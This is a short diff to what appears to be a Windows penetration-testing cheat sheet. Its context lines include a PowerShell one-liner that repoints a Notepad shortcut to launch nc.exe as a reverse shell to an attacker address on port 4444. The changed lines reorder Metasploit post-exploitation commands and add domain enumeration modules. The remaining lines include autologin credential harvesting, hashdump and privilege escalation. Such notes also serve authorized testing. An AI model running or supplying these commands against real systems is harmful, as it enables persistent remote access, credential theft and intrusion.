@@ -389,11 +389,13 @@ URL=C:\programdata\shell.bat
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Common Applications\Notepad.lnk');$s.TargetPath='C:\Windows\System32\cmd.exe';$s.Arguments='/c \"C:\ProgramData\nc.exe $MYIP 4444 -e cmd\"';$s.Save()"
 
 [*] Metasploit
-arp
-ipconfig
-sysinfo
 getuid
 getprivs
+sysinfo
+arp
+ipconfig
+run post/windows/gather/enum_domain
+run post/windows/gather/enum_domains
 run post/windows/gather/credentials/windows_autologin
 hashdump
 use priv
